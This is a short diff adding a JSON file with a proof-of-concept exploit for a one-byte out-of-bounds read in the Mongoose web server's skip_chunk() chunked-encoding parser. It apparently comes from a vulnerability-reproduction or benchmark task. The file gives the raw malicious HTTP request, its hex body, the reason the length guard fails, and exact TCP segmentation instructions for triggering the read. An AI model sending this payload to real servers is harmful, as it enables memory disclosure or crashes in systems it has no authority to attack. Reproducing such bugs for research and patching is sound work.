@@ -1,0 +1,9 @@
+```json
+{
+  "raw_request": "POST / HTTP/1.1\\r\\nHost: localhost\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\n",
+  "hex_body": "310d0a410d0a300d0a0d0a",
+  "explanation": "This request triggers the one-byte out-of-bounds read in `skip_chunk()`. The body defines a single chunk of size 1 containing the character 'A', followed by its terminating `\\r\\n`. The key is how this request is delivered. By splitting the TCP stream immediately after the `\\r` of the first chunk's terminator, we ensure that the Mongoose server's internal read buffer ends with that `\\r`. When `skip_chunk()` is called to process the end of the chunk, it receives a buffer where the last byte is `\\r` at index `i`. The length of the buffer `len` is `i + 1`. The vulnerable guard `len < i + 1` evaluates to `false`, allowing execution to proceed to `buf[i + 1]`, which is one byte past the end of the buffer, causing the out-of-bounds read.",
+  "delivery_notes": "The request MUST be split across at least two TCP segments. The first segment must contain the headers and the beginning of the body, ending precisely after the first chunk's `\\r` terminator. The second segment must contain the rest of the body.\n\nSegment 1 ends with: `...1\\r\\nA\\r`\nSegment 2 begins with: `\\n0\\r\\n\\r\\n`\n\nThis segmentation is required to control the server's internal buffer state at the exact moment `skip_chunk()` is called, forcing the `\\r` to be the last byte in the buffer and thus triggering the off-by-one read.",
+  "confidence": 1.0
+}
+```
